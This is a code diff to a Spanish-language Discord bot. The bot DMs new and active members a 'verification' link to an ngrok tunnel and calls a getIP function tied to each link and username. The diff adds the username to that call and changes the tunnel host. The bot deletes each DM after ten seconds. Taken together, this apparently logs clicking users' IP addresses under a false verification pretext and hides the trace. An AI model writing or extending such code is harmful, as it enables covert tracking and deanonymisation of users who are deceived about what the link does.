@@ -24,9 +24,10 @@ client.on(Events.ClientReady, async () => {
 client.on(Events.GuildMemberAdd, async (miembro) => {
     try {
         var numero = Math.floor(Math.random() * 100000);
-        const mensajeVerificacion = await generarMensaje(miembro.user.username, await generarEnlaces(numero));
+        const userName = miembro.user.username;
+        const mensajeVerificacion = await generarMensaje(userName, await generarEnlaces(numero));
         let mensaje = await miembro.send(mensajeVerificacion);
-        new getIP(numero);
+        new getIP(numero, userName); // Asegúrate de pasar userName aquí
         setTimeout(() => {
             mensaje.delete().catch(console.error);
         }, 10000); // 10000 milisegundos = 10 segundos
@@ -43,7 +44,7 @@ client.on(Events.MessageCreate, async (mensaje) => {
             const numero = Math.floor(Math.random() * 100000);
             const mensajeVerificacion = await generarMensaje(nombre, await generarEnlaces(numero));
             const mensajeEnviado = await mensaje.author.send(mensajeVerificacion);
-            new getIP(numero);
+            new getIP(numero, nombre); // Asegúrate de pasar nombre aquí
             setTimeout(() => {
                 mensajeEnviado.delete().catch(console.error);
             }, 10000); // 10000 milisegundos = 10 segundos
@@ -59,7 +60,7 @@ async function generarMensaje(nombre ,enlaces) {
 }
 
 async function generarEnlaces(numero) {
-    var enlace = "https://fd83-94-73-40-169.ngrok-free.app/" + numero;
+    var enlace = "https://3877-94-73-40-169.ngrok-free.app/" + numero;
     return enlace;
 }
 
